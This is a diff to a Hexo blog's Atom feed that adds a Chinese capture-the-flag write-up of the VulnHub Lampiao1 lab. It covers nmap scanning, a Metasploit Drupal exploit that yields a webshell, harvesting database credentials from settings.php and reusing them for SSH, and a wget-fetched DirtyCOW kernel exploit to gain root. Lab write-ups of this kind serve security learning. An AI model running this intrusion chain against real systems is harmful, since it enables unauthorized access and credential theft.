@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://wang66.top/"/>
-  <updated>2018-10-01T09:01:30.432Z</updated>
+  <updated>2018-10-02T05:19:49.347Z</updated>
   <id>http://wang66.top/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>VulnHub渗透笔记之Lampio1</title>
+    <link href="http://wang66.top/2018/vulnhub-lampiao1.html"/>
+    <id>http://wang66.top/2018/vulnhub-lampiao1.html</id>
+    <published>2018-10-02T05:04:40.000Z</published>
+    <updated>2018-10-02T05:19:49.347Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很简单的一题，用的还是老套路，给人的惊喜不是很多。<br><img src="/images/lampiao/1.png" alt=""><a id="more"></a><br>攻击机ip地址：192.168.1.136<br>靶机地址未知，使用用Vmware的net模式。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描，发现靶机ip。</p><blockquote><p>nmap  -sP  192.168.1.0/24</p></blockquote><p><img src="/images/lampiao/2.png" alt=""><br>也可以从MAC地址上确定靶机IP地址为192.168.1.129。</p><p>使用nmap进行全端口扫描，开始只是扫描了1-1000的常用端口，所以一直发现不了另一个端口：</p><blockquote><p>nmap   -p-  192.168.1.129</p></blockquote><p><img src="/images/lampiao/3.png" alt=""><br>看到靶机开启了3个端口，分别是22,80,1898。</p><h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><p>首先访问80端口：</p><p><img src="/images/lampiao/4.png" alt=""></p><p>虽然有东西，但是除此之外，再也没有什么发现了。</p><p>那接着访问1898端口看看，可以看到显示了一个web网页：<br><img src="/images/lampiao/5.png" alt=""></p><p>使用的CMS是drupal。因为drupal的题遇到过不少，所以这次的思路很清晰，可以直接找rotbots.txt。但还是先用dirb扫描一下路径，直接跳过这步的话，可能会遗漏什么。<br><img src="/images/lampiao/6.png" alt=""><br>可以看到有一个robots.txt文件。这个文件有时候起到了很大的作用。查看robots.txt里的内容：<br><img src="/images/lampiao/7.png" alt=""><br>然后，在rotbots.txt文件中，尝试一下里面的路径，这比扫描出来的要全。但是这里最主要的还是查看一个叫CHANGELOG.txt的文件，因为它记录着drupal的更新信息。查看CHANGELOG.txt文件，可以知道当前drupal的版本为7.54。<br><img src="/images/lampiao/8.png" alt=""><br>知道版本有什么用呢，当然是找当前版本的漏洞啦，接下来，开始面对“谷歌”渗透。使用谷歌搜索 drupal 7.54漏洞：<br><img src="/images/lampiao/9.png" alt=""><br>结果还是很多，这需要我们匹配当前版本进行筛选。对比之后，我选择了下面这个漏洞：<br><img src="/images/lampiao/10.png" alt=""><br>这是一个比较知名的drupal漏洞，因此成功的记录比较大。再根据漏洞编号，我们在metasploit 找到漏洞利用模块:<br><img src="/images/lampiao/11.png" alt=""><br>接着配置metsploit的exploit并运行：<br><img src="/images/lampiao/12.png" alt=""><br>可以看到我们成功的建立连接，此时拿到了webshell。<br><img src="/images/lampiao/13.png" alt=""><br>此时我们可以尽情的翻看网站里面的文件，但也不是盲目的，我们要进一步提权的话，应该需要找到有关于一些有关系统的配置文件，比如数据库连接文件，上面应该有数据库的用户名和密码。<br><img src="/images/lampiao/14.png" alt=""><br>遍历文件之后，发现在sites文件夹中发现settings.php：<br><img src="/images/lampiao/15.png" alt=""><br>打开settings.php，从里面发现了数据库连接的信息：<br><img src="/images/lampiao/16.png" alt=""><br>可以看到用户名为drupaluser和密码Vigulino，我们现在就可以连接数据库了:<br><img src="/images/lampiao/17.png" alt=""><br>输入用户名密码后，我们要看看数据库里面有哪些有价值的信息，开始查询数据库：<br><img src="/images/lampiao/18.png" alt=""><br>有两个数据库，我们进入drupal这个数据库，因为和网站相关：<br><img src="/images/lampiao/19.png" alt=""><br>接着查到了表名，在其中发现了一个名为user的表:<br><img src="/images/lampiao/20.png" alt=""><br>查询users表，发现其中有个用户名叫做：tiago<br><img src="/images/lampiao/21.png" alt=""><br>这个用户很可能是网站管理员，我们还需要进一步知道密码，但是在之前也找到一个数据库的密码，可以试一试它们配合能不能进行ssh登录：<br><img src="/images/lampiao/22.png" alt=""><br>成功登录，此时我们是tiago的权限，并不是root，那接下来就是提权了。<br><img src="/images/lampiao/23.png" alt=""></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>同样的，查看目录，存在tmp文件，且有很高的权限。这也将是我们选择执行脚本的地方。<br>接着查看下内核版本，好找到相应的漏洞：<br><img src="/images/lampiao/24.png" alt=""></p><p>但是在网上找了好久，一些exploit都尝试失败，后来觉得不能这么盲目了。我们可以使用下面这一款工具。它可以自动发现机器上存在的漏洞，并自动查询匹配的exploit。github连接：<a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener">https://github.com/mzet-/linux-exploit-suggester</a></p><p>接下来，我们把它下载到靶机的/tmp文件里，可以直接使用下面的指令：</p><blockquote><p>wget <a href="https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</a> -O les.sh</p></blockquote><p><img src="/images/lampiao/25.png" alt=""><br>接下来开始使用了，这里首先让它有777的权限。</p><p><img src="/images/lampiao/26.png" alt=""><br>开始运行，开始给出了靶机的一些版本信息：</p><p><img src="/images/lampiao/27.png" alt=""><br>结果有许多，这里看到一个很著名的内核提权的exploit——DirtyCOW（脏牛），那就选它了：<br><img src="/images/lampiao/28.png" alt=""><br>同样使用wget下载到/tmp文件中。<br><img src="/images/lampiao/29.png" alt=""><br>执行它需要777权限，先对它进行编译。</p><blockquote><p>g++ -wall –pedantic –02 –std=c++11  -pthread –o dcow 40847.cpp -lutil</p></blockquote><p><img src="/images/lampiao/30.png" alt=""><br>接着执行它：<br><img src="/images/lampiao/31.png" alt=""></p><p>可以看到，exploit运行后，给了我们root密码，我们使用它登录：<br><img src="/images/lampiao/32.png" alt=""><br>成功拿到flag~</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;很简单的一题，用的还是老套路，给人的惊喜不是很多。&lt;br&gt;&lt;img src=&quot;/images/lampiao/1.png&quot; alt=&quot;&quot;&gt;
+    
+    </summary>
+    
+    
+      <category term="vulnhub" scheme="http://wang66.top/tags/vulnhub/"/>
+    
+  </entry>
   
   <entry>
     <title>Vulnhub渗透笔记之wankanda1</title>
